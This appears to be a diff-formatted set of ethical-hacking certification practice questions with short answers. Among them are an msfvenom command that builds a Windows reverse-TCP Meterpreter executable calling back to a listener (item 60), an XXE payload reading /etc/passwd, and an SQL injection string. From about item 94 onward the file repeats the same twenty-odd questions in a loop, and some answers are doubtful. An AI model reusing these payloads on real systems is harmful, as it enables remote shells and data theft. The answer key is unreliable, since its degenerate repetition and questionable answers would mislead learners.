@@ -1,0 +1,670 @@
+1. Which of the following tactics uses malicious code to redirect users' web traffic?  
+Answer: Pharming
+
+2. Garry, a network administrator, uses SNMP to manage networked devices remotely. He accesses the contents of MIB for workstations and server services. Which type of MIB is accessed by Garry?  
+Answer: LNMIB2.MIB
+
+3. Daniel attempts an SQL injection attack on www.moviescope.com. What evasion technique does he use when placing characters such as `'or `˜1'=`˜1'`?  
+Answer: Variation
+
+4. Abel, a cloud architect, uses container technology and follows the five-tier container technology architecture. What tier is Abel working in when verifying and validating image contents, signing images, and sending them to registries?  
+Answer: Tier-2: Testing and accreditation systems
+
+5. What is the first step for a hacker conducting a DNS cache poisoning (DNS spoofing) attack?  
+Answer: The attacker forges a reply from the DNS resolver.
+
+6. Sam, a penetration tester, performs port scanning and uses FIN/ACK probes. What port scanning technique is used by Sam to discover open ports?  
+Answer: TCP Maimon scan
+
+7. Which type of malware spreads from one system to another and causes similar damage as viruses?  
+Answer: Worms
+
+8. A medical company experiences a cybersecurity breach exposing patient records. Which regulation is likely violated?  
+Answer: HIPAA/PHI
+
+9. Jude, a pen tester, performs an external assessment on a network to identify vulnerabilities and estimate the threat of network security attacks. What type of vulnerability assessment is this?  
+Answer: External assessment
+
+10. Attacker Rony installs a rogue access point and attempts to intrude into an organization's internal network. What type of vulnerability assessment does Johnson perform to counter this?  
+Answer: Wireless network assessment
+
+11. Judy discovers a user posting strange images in her forum. A security expert finds malicious code in the images. What issue occurred for users who clicked on the image?  
+Answer: The PHP file silently executes, grabbing the user's session cookie and session ID.
+
+12. Bella, a security professional, implements a protocol that sends data using encryption and digital certificates to address a security breach. What protocol does Bella use?  
+Answer: FTPS
+
+13. To increase network security, what solution keeps a wireless network undiscoverable and accessible only to those who know it?  
+Answer: Disable SSID broadcasting
+
+14. Mason spreads Emotet malware using a self-extracting RAR file to retrieve information about network resources. What tool does Mason employ?  
+Answer: Credential enumerator
+
+15. In an attack tricking a victim into reinstalling an already-in-use key, manipulating and replaying cryptographic handshake messages, what is this attack called?  
+Answer: KRACK
+
+16. John, a security personnel, employs a security scanner to automate web-application security testing and detect XSS, directory transversal problems, and SQL injection. What security scanner does John use?  
+Answer: Syhunt Hybrid
+
+17. What is the purpose of running "wget 192.168.0.15 -q -S" against a web server?  
+Answer: Using wget to perform banner grabbing on the webserver
+
+18. As a penetration tester testing a WPA3 encrypted wireless network, which vulnerability is promising to exploit?  
+Answer: Dragonblood
+
+19. What is the mechanism called in cryptography for recovering BitLocker encryption keys from Active Directory?  
+Answer: Key archival
+
+20. Richard, an attacker, uses footprinting to gather domain information such as domain name, contact details, expiry date, and creation date. What type of footprinting is this?  
+Answer: Whois footprinting
+
+21. To create a botnet, what technique involves scanning vulnerable machines, dividing a list, and simultaneously infecting machines?  
+Answer: Hit-list scanning technique
+
+22. Ethical hacker Jane Smith attempts to perform an SQL injection attack. What two SQL injection types would give her the results she is looking for?  
+Answer: Time-based and boolean-based
+
+23. Andrew, an Ethical Hacker, needs to discover all active devices hidden by a restrictive firewall. What host discovery technique must he use?  
+Answer: ARP ping scan
+
+24. Bill, a network administrator, wants to eliminate unencrypted traffic inside his company's network. He sets up a SPAN port and discovers unencrypted traffic on UDP 161. What protocol is this port using?  
+Answer: SNMP, and he should change it to SNMP V3
+
+25. Security administrator John Smith notices abnormal amounts of traffic at night, and user data has been exfiltrated. What type of malware bypasses application whitelisting?  
+Answer: File-less malware
+
+26. CyberTech Inc. experiences SQL injection attacks, and Bob is appointed to build defensive strategies. What defensive technique involves approving only a list of entities for secured access?  
+Answer: Whitelist validation
+
+27. David, a security professional, is implementing a vulnerability management program. In which phase is he applying fixes on vulnerable systems?  
+Answer:
+
+ Mitigation phase
+
+28. Lisa, a cybersecurity analyst, observes an alert in the IDS logs when the external router is accessed from the administrator's computer to update the router configuration. What type of alert is this?  
+Answer: True positive
+
+29. A hacker discovers a vulnerability in a widely used operating system. To exploit this, he writes a program that takes advantage of the vulnerability and releases it. What is this program called?  
+Answer: Exploit
+
+30. What is the primary purpose of a DNS sinkhole in a network security context?  
+Answer: To redirect malicious traffic to a controlled destination
+
+31. Andy, a security analyst, needs to implement a security control to ensure that data in transit between a client and a server is encrypted. What protocol will he use?  
+Answer: HTTPS
+
+32. What technique does an attacker use to exploit vulnerabilities to gain unauthorized access and execute malicious code while avoiding detection?  
+Answer: Polymorphic malware
+
+33. Jake, a professional hacker, installed spyware on a target iPhone to spy on the user's activities. What is the type of spyware that Jake used to infect the target device?  
+Answer: Trident
+
+34. Sam, a professional hacker, targeted an organization with the intention of compromising AWS IAM credentials. What is the technique used by Sam to compromise the AWS IAM credentials?  
+Answer: Social engineering
+
+35. Judy created a forum. She discovers a user posting strange images without writing comments. A security expert finds hidden code in the images. What issue occurred for users who clicked on the image?  
+Answer: The PHP code silently executes, grabbing the user's session cookie and session ID.
+
+36. Becky, hired for a penetration test against a remote office, runs reconnaissance scans and notices the IP was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for detailed information?  
+Answer: RIPE
+
+37. Joe turns on his home computer to access personal online banking. When he enters the URL www.bank.com, the website prompts him to re-enter his credentials, and the web address appears different. What type of attack is Joe experiencing?  
+Answer: DNS hijacking
+
+38. Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. Which attack technique is used by Stella to compromise the web services?  
+Answer: WS-Address spoofing
+
+39. When considering how an attacker may exploit a web server, what is web server footprinting?  
+Answer: Gathering system-level data, including account details and server names
+
+40. Tony wants to integrate a 128-bit symmetric block cipher into a software program with key sizes of 128, 192, or 256 bits. Which algorithm includes all these features and can be integrated by Tony?  
+Answer: Serpent
+
+41. Attacker Lauren gains credentials for an organization's internal server system. Security professional Robert analyzes the compromised device to determine incident details. What is the incident handling and response (IH&R) phase in which Robert determines these issues?  
+Answer: Incident triage
+
+42. Annie, a cloud security engineer, uses Docker architecture in her application, employing a component to process API requests and handle various Docker objects. What component is used by Annie in this scenario?  
+Answer: Docker daemon
+
+43. Clark, a professional hacker, was hired to gather sensitive information about a competitor organization. Clark gathers the server IP address and uses an online tool to retrieve network information. What online tool is employed by Clark?  
+Answer: ARIN
+
+44. What allows attackers to draw a map or outline the target organization's network infrastructure to know about the actual environment they are going to hack?  
+Answer: Scanning networks
+
+45. Stephen, an attacker, targets industrial control systems and uses a fraudulent email with a malicious attachment to damage the systems. What attack technique is used by Stephen?  
+Answer: Spear-phishing attack
+
+46. You are authorized to perform a penetration test against a website. You want to use Google dorks to footprint the site but only want results that show file extensions. What Google dork operator would you use?  
+Answer: filetype
+
+47. What web vulnerability would an attacker be attempting to exploit with the following input? `<!DOCTYPE blah [ < !ENTITY trustme SYSTEM "file:///etc/passwd" > ] >`  
+Answer: XXE
+
+48. Steve, an attacker, creates a fake profile on a social media website, gathers information from a target, and uses a Honey Trap technique. What social engineering technique does Steve employ?  
+Answer: Honey trap
+
+49. When analyzing IDS logs, the system administrator notices an alert when the external router is accessed from the administrator's computer to update the router configuration. What type of alert is this?  
+Answer: True positive
+
+50. Calvin, a software developer, uses a feature susceptible to server-side includes injection. What type of injection attack is Calvin's web application susceptible to?  
+Answer: Server-side includes injection
+
+51. John, a professional hacker, targets an organization using LDAP for accessing distributed directory services. What tool does John employ to gather information from the LDAP service?  
+Answer: JXplorer
+
+52. What type of attack is a Blind SQL injection attack where no error messages are shown, and information is extracted based on true or false server responses?  
+Answer: Blind SQL injection
+
+53. Richard, an attacker, targets an MNC and uses footprinting to gather domain information, misleads domain owners, and obtains internal details. What type of footprinting technique does Richard employ?  
+Answer: Whois footprinting
+
+54. An attacker redirects the victim to malicious websites via a malicious link sent by email. What type of attack is this?  
+Answer: Phishing
+
+55. Samuel, a professional hacker, monitors and intercepts traffic between Bob and a host machine to predict Bob's ISN. What type of attack is performed by Samuel?  
+Answer: TCP/IP hijacking
+
+56. Geena, a cloud architect, uses a master component in Kubernetes to assign nodes based on factors like resource requirements. What master component is explained in the scenario?  
+Answer: Kube-scheduler
+
+57. In a penetration test, you gain access under a user account and establish a connection via the SMB service, occasionally entering plaintext login and password. What file must you clean to clear the password?  
+Answer: .bash_history
+
+58. Which rootkit adds or replaces some of the operating-system kernel code to obscure a backdoor on a system?  
+Answer: Kernel-level rootkit
+
+59. If you send a TCP ACK segment to a known closed port on a firewall but do not get an RST response, what do you know about the firewall you are scanning?  
+Answer: It is a stateful firewall.
+
+60. What is the correct way of using MSFvenom to generate a reverse TCP shellcode for Windows?  
+Answer: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe`
+
+61. In a scenario where an attacker creates a transparent 'iframe' to trick a victim into clicking on a different URL, what is the name of the attack?  
+Answer: Clickjacking attack
+
+62. Hailey, a professional hacker, gathers a list of words from a target website using various tools for a brute-force attack. What tool does Hailey use for this purpose?  
+Answer: CeWL
+
+63. Johnson, an attacker, dials a number pretending to represent a technical support team and convinces the victim to execute unusual commands. What social engineering technique does Johnson employ?  
+Answer: Quid pro quo
+
+64. Mary, a penetration tester, finds password hashes and needs to continue with the test. What type of attack can she implement without finding the corresponding passwords?  
+Answer: Pass the hash
+
+65. John, a professional hacker, gains unauthorized access to a network, remains undetected for a long time, and obtains sensitive information without sabotaging the organization. What attack technique does John use?  
+Answer: Advanced persistent threat
+
+66. John investigates web-application firewall logs and notices someone attempting to inject: `char buff[10]; buff[10] = 'a';` What type of attack is this?  
+Answer: Buffer overflow
+
+67. Alex, a cloud security engineer, uses an open-source technology for developing, packaging, and running applications with OS-level virtualization. What cloud technology does Alex use?  
+Answer: Docker
+
+68. A bank stores sensitive privacy information related to home loans and has never enabled auditing. What is the first step before enabling the audit feature?  
+Answer: Determine the impact of enabling the audit feature.
+
+69. A group of hackers roams around a bank office building with hacking tools, searching for a free-access wireless network. What is this hacking process known as?  
+Answer: Wardriving
+
+70. A friend downloads and executes a file sent by a coworker, suspecting a trojan. What tests would you perform to determine if his computer is infected?  
+Answer: Use netstat and check for outgoing connections to strange IP addresses or domains.
+
+71. Bob, a system administrator, concludes that a DMZ is not needed if he configures the firewall to allow access to servers with direct internet access. What can you say about Bob's conclusion?  
+Answer: Bob is totally wrong. DMZ is always relevant when the company has internet servers and workstations.
+
+72. Ralph, a professional hacker, contacts Jane masquerading as a technical support executive, enters Jane's company, and gathers sensitive information. What attack technique does Ralph use?  
+Answer: Impersonation
+
+73. While testing a web application, you notice the server does not properly ignore `dot dot slash` (../). What kind of attack is possible?  
+Answer: Directory traversal
+
+74. Mark, a security analyst, observes a sudden increase in outbound traffic from a company's network. He suspects a potential data exfiltration attempt. What type of security control can help prevent or detect this kind of activity?  
+Answer: Data loss prevention (DLP)
+
+75. Kevin, a system administrator, wants to limit the potential damage of a malware outbreak on his organization's network. What security principle suggests minimizing the number of systems an attacker can access or compromise?  
+Answer: Principle of least privilege
+
+76. In a scenario where an attacker is exploiting a vulnerability in a networked device to create a botnet, what kind of attack is taking place?  
+Answer: Remote code execution
+
+77. What is the primary purpose of an intrusion detection system (IDS) in a network security context?  
+Answer: To detect and respond to suspicious or malicious activities
+
+78. When dealing with a security incident, what is the purpose of preserving evidence?  
+Answer: To support forensic investigation and potential legal action
+
+79. Sophie, a security analyst, is configuring a firewall to allow or deny network traffic based on its characteristics. What type of firewall rule is she configuring?  
+Answer: Stateful rule
+
+80. Bob, a security administrator, is configuring a web application firewall (WAF) to protect against SQL injection attacks. What type of security control is the WAF in this context?  
+Answer: Application-layer firewall
+
+81. In a security context, what does the term "zero-day" refer to?  
+Answer: An undisclosed and unpatched vulnerability that is actively exploited
+
+82. Mia, a security analyst, notices a sudden increase in the number of failed login attempts on the company's VPN server. What kind of attack is this indicative of?  
+Answer: Brute-force attack
+
+83. What security measure can help protect against man-in-the-middle (MitM) attacks on untrusted networks?  
+Answer: Using a virtual private network (VPN)
+
+84. In the context of network security, what is the purpose of a honeypot?  
+Answer: To attract and detect attackers or malware by simulating a vulnerable system
+
+85. Ethan, a network administrator, is implementing a security control to prevent unauthorized access by verifying the identity of users and devices. What type of security control is he implementing?  
+Answer: Authentication
+
+86. What security measure can help protect against phishing attacks targeting sensitive information such as usernames and passwords?  
+Answer: Multi-factor authentication (MFA)
+
+87. When encrypting data for secure transmission over the internet, what protocol is commonly used?  
+Answer: TLS (Transport Layer Security)
+
+88. In the context of access control, what is the principle of least privilege?  
+Answer: Granting users the minimum level of access necessary to perform their job functions
+
+89. Natalie, a security analyst, is reviewing logs and notices an unusual pattern of activity involving multiple failed login attempts followed by a successful login. What kind of attack is this indicative of?  
+Answer: Credential stuffing
+
+90. What security measure can help protect against unauthorized access to sensitive data by restricting access based on user roles and permissions?  
+Answer: Role-based access control (RBAC)
+
+91. In a security context, what does the term "social engineering" refer to?  
+Answer: Manipulating individuals to disclose sensitive information or perform actions that may compromise security
+
+92. Henry, a system administrator, is configuring a firewall to allow or block traffic based on source and destination IP addresses. What type of firewall rule is he configuring?  
+Answer: Network-layer rule
+
+93. In the context of network security, what is the purpose of a VPN (Virtual Private Network)?  
+Answer: To create a secure, encrypted connection over an untrusted network
+
+94. What security control can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+95. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+96. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+97. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+98. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+99. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+100. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+101. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
+
+102. In the context of security incident response, what is the purpose of the eradication phase?  
+Answer: To permanently remove the threat or vulnerability that caused the incident
+
+103. What security measure can help protect against data breaches by encrypting sensitive information stored on storage devices?  
+Answer: Disk encryption
+
+104. Maria, a security analyst, is configuring a security control to identify and block malicious URLs or websites. What type of security control is she configuring?  
+Answer: Web filtering
+
+105. When securing a computer system, what is the purpose of regularly applying software updates and patches?  
+Answer: To address known vulnerabilities and improve security
+
+106. What security principle suggests that critical systems should be redundant and have backup capabilities to ensure continuous operation in case of failures?  
+Answer: Redundancy
+
+107. Olivia, a security administrator, is configuring a security control to monitor and log all user access to sensitive files. What type of security control is she configuring?  
+Answer: Audit logging
+
+108. In the context of access control, what is the purpose of the "deny" rule in a firewall?  
+Answer: To block specified network traffic
+
+109. When configuring a firewall, what is the purpose of an "deny" rule?  
+Answer: To block specified network traffic
+
+110. In the context of security incident response, what is the purpose of the recovery phase?  
+Answer: To restore affected systems and services to normal operation
+
+111. What security measure can help protect against unauthorized access to a computer system by requiring users to enter a password or passphrase?  
+Answer: Password authentication
+
+112. When securing a computer system, what security measure can help protect against malware by restricting users from running certain types of programs?  
+Answer: Application whitelisting
+
+113. Daniel, a security analyst, is implementing a security control to monitor and block malicious network traffic based on predefined signatures. What type of security control is he implementing?  
+Answer: Intrusion prevention system (IPS)
+
+114. In the context of security incident response, what is the purpose of the investigation phase?  
+Answer: To gather information and determine the cause and extent of the incident
+
+115. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+116. When securing a wireless network
+
+, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+117. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+118. What security measure can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+119. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+120. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+121. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+122. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+123. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+124. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+125. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
+
+126. In the context of security incident response, what is the purpose of the eradication phase?  
+Answer: To permanently remove the threat or vulnerability that caused the incident
+
+127. What security measure can help protect against data breaches by encrypting sensitive information stored on storage devices?  
+Answer: Disk encryption
+
+128. Maria, a security analyst, is configuring a security control to identify and block malicious URLs or websites. What type of security control is she configuring?  
+Answer: Web filtering
+
+129. When securing a computer system, what is the purpose of regularly applying software updates and patches?  
+Answer: To address known vulnerabilities and improve security
+
+130. What security principle suggests that critical systems should be redundant and have backup capabilities to ensure continuous operation in case of failures?  
+Answer: Redundancy
+
+131. Olivia, a security administrator, is configuring a security control to monitor and log all user access to sensitive files. What type of security control is she configuring?  
+Answer: Audit logging
+
+132. In the context of access control, what is the purpose of the "deny" rule in a firewall?  
+Answer: To block specified network traffic
+
+133. When configuring a firewall, what is the purpose of an "deny" rule?  
+Answer: To block specified network traffic
+
+134. In the context of security incident response, what is the purpose of the recovery phase?  
+Answer: To restore affected systems and services to normal operation
+
+135. What security measure can help protect against unauthorized access to a computer system by requiring users to enter a password or passphrase?  
+Answer: Password authentication
+
+136. When securing a computer system, what security measure can help protect against malware by restricting users from running certain types of programs?  
+Answer: Application whitelisting
+
+137. Daniel, a security analyst, is implementing a security control to monitor and block malicious network traffic based on predefined signatures. What type of security control is he implementing?  
+Answer: Intrusion prevention system (IPS)
+
+138. In the context of security incident response, what is the purpose of the investigation phase?  
+Answer: To gather information and determine the cause and extent of the incident
+
+139. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+140. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+141. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+142. What security measure can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+143. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+144. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+145. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+146. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+147. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+148. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+149. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
+
+150. In the context of security incident response, what is the purpose of the eradication phase?  
+Answer: To permanently remove the threat or vulnerability that caused the incident
+
+151. What security measure can help protect against data breaches by encrypting sensitive information stored on storage devices?  
+Answer: Disk encryption
+
+152. Maria, a security analyst, is configuring a security control to identify and block malicious URLs or websites. What type of security control is she configuring?  
+Answer: Web filtering
+
+153. When securing a computer system, what is the purpose of regularly applying software updates and patches?  
+Answer: To address known vulnerabilities and improve security
+
+154. What security principle suggests that critical systems should be redundant and have backup capabilities to ensure continuous operation in case of failures?  
+Answer: Redundancy
+
+155. Olivia, a security administrator, is configuring a security control to monitor and log all user access to sensitive files. What type of security control is she configuring?  
+Answer: Audit logging
+
+156. In the context of access control, what is the purpose of the "deny" rule in a firewall?  
+Answer: To block specified network traffic
+
+157. When configuring a firewall, what is the purpose of an "deny" rule?  
+Answer: To block specified network traffic
+
+158. In the context of security incident response, what is the purpose of the recovery phase?  
+Answer: To restore affected systems and services to normal operation
+
+159. What security measure can help protect against unauthorized access to a computer system by requiring users to enter a password or passphrase?  
+Answer: Password authentication
+
+160
+
+. When securing a computer system, what security measure can help protect against malware by restricting users from running certain types of programs?  
+Answer: Application whitelisting
+
+161. Daniel, a security analyst, is implementing a security control to monitor and block malicious network traffic based on predefined signatures. What type of security control is he implementing?  
+Answer: Intrusion prevention system (IPS)
+
+162. In the context of security incident response, what is the purpose of the investigation phase?  
+Answer: To gather information and determine the cause and extent of the incident
+
+163. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+164. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+165. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+166. What security measure can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+167. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+168. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+169. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+170. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+171. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+172. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+173. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
+
+174. In the context of security incident response, what is the purpose of the eradication phase?  
+Answer: To permanently remove the threat or vulnerability that caused the incident
+
+175. What security measure can help protect against data breaches by encrypting sensitive information stored on storage devices?  
+Answer: Disk encryption
+
+176. Maria, a security analyst, is configuring a security control to identify and block malicious URLs or websites. What type of security control is she configuring?  
+Answer: Web filtering
+
+177. When securing a computer system, what is the purpose of regularly applying software updates and patches?  
+Answer: To address known vulnerabilities and improve security
+
+178. What security principle suggests that critical systems should be redundant and have backup capabilities to ensure continuous operation in case of failures?  
+Answer: Redundancy
+
+179. Olivia, a security administrator, is configuring a security control to monitor and log all user access to sensitive files. What type of security control is she configuring?  
+Answer: Audit logging
+
+180. In the context of access control, what is the purpose of the "deny" rule in a firewall?  
+Answer: To block specified network traffic
+
+181. When configuring a firewall, what is the purpose of an "deny" rule?  
+Answer: To block specified network traffic
+
+182. In the context of security incident response, what is the purpose of the recovery phase?  
+Answer: To restore affected systems and services to normal operation
+
+183. What security measure can help protect against unauthorized access to a computer system by requiring users to enter a password or passphrase?  
+Answer: Password authentication
+
+184. When securing a computer system, what security measure can help protect against malware by restricting users from running certain types of programs?  
+Answer: Application whitelisting
+
+185. Daniel, a security analyst, is implementing a security control to monitor and block malicious network traffic based on predefined signatures. What type of security control is he implementing?  
+Answer: Intrusion prevention system (IPS)
+
+186. In the context of security incident response, what is the purpose of the investigation phase?  
+Answer: To gather information and determine the cause and extent of the incident
+
+187. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+188. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+189. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+190. What security measure can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+191. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+192. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+193. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+194. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+195. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+196. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+197. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
+
+198. In the context of security incident response, what is the purpose of the eradication phase?  
+Answer: To permanently remove the threat or vulnerability that caused the incident
+
+199. What security measure can help protect against data breaches by encrypting sensitive information stored on storage devices?  
+Answer: Disk encryption
+
+200. Maria, a security analyst, is configuring a security control to identify and block malicious URLs or websites. What type of security control is she configuring?  
+Answer: Web filtering
+
+201. When securing a computer system, what is the purpose of regularly applying software updates and patches?  
+Answer: To address known vulnerabilities and improve security
+
+202. What security principle suggests that critical systems should be redundant and have backup capabilities to ensure continuous operation in case of failures?  
+Answer: Redundancy
+
+203. Olivia, a security administrator, is configuring a security
+
+ control to monitor and log all user access to sensitive files. What type of security control is she configuring?  
+Answer: Audit logging
+
+204. In the context of access control, what is the purpose of the "deny" rule in a firewall?  
+Answer: To block specified network traffic
+
+205. When configuring a firewall, what is the purpose of an "deny" rule?  
+Answer: To block specified network traffic
+
+206. In the context of security incident response, what is the purpose of the recovery phase?  
+Answer: To restore affected systems and services to normal operation
+
+207. What security measure can help protect against unauthorized access to a computer system by requiring users to enter a password or passphrase?  
+Answer: Password authentication
+
+208. When securing a computer system, what security measure can help protect against malware by restricting users from running certain types of programs?  
+Answer: Application whitelisting
+
+209. Daniel, a security analyst, is implementing a security control to monitor and block malicious network traffic based on predefined signatures. What type of security control is he implementing?  
+Answer: Intrusion prevention system (IPS)
+
+210. In the context of security incident response, what is the purpose of the investigation phase?  
+Answer: To gather information and determine the cause and extent of the incident
+
+211. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+212. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+213. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+214. What security measure can help protect against unauthorized access to a physical facility by requiring users to verify their identity using biometric information?  
+Answer: Biometric access control
+
+215. Emily, a security analyst, is implementing a security control to monitor and analyze network traffic for signs of suspicious activity or threats. What type of security control is she implementing?  
+Answer: Intrusion detection system (IDS)
+
+216. In the context of security incident response, what is the purpose of the containment phase?  
+Answer: To prevent the spread or escalation of the incident
+
+217. When securing a wireless network, what security measure can help protect against unauthorized users gaining access to the network?  
+Answer: WPA3 (Wi-Fi Protected Access 3)
+
+218. Jessica, a security administrator, is configuring a security control to identify and block malicious software or code. What type of security control is she configuring?  
+Answer: Antivirus software
+
+219. What security principle suggests that users should only have access to the resources and data necessary for their job functions?  
+Answer: Principle of least privilege
+
+220. When configuring a firewall, what is the purpose of an "allow" rule?  
+Answer: To permit specified network traffic
+
+221. Tom, a security analyst, is reviewing logs and notices a large volume of traffic from a single IP address attempting to overwhelm a web server. What kind of attack is this indicative of?  
+Answer: DDoS (Distributed Denial of Service) attack
